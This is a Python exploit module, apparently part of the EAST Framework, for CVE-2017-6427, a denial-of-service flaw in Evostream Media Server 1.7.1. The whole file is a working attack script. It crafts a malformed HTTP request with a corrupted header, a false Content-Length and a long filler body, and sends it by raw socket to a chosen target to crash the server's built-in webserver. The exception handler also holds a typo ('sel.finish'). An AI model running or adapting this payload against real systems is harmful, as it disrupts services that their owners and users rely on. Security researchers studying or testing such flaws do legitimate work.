#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
import struct

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_evostream_media_server_dos"
INFO['DESCRIPTION'] = "Evostream Media Server 1.7.1 (x64) - Denial of Service"
INFO['VENDOR'] = "https://evostream.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41547/']
INFO["CVE Name"] = "CVE-2017-6427"
INFO["NOTES"] = """Evostream Media Server 1.7.1 â€“ Built-in Webserver DoS
"""
INFO['CHANGELOG'] = "09 Mar, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 8080, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        packet = "GET /index.html HTTP/1.1\r\n"
        packet +="Host: {}:{}\r\n".format(self.host, self.port)
        packet += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:44.0) Gecko/20100101 Firefox/44.0 Iceweasel/44.0.2\r\n"
        packet += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        packet += "Accept-Language: en-US,en;q=0.5\r\n"
        packet += "Accept-Encoding: gzip, deflate\r\n"
        packet += "Referer: http://192.168.1.1/login\r\n"
        packet += "Connection: keep-alive\r\n"
        packet += "Cont" + "\x41" * 8 + ":\r\n"
        packet += "application/x-www-form-urlencoded\r\n"
        packet += "Content-Length: 5900\r\n\r\n"
        packet += "B" * 4096
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, self.port))
            s.sendall(packet)
            s.close()
        except Exception as e:
            self.log(e)
            sel.finish(False)
            
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
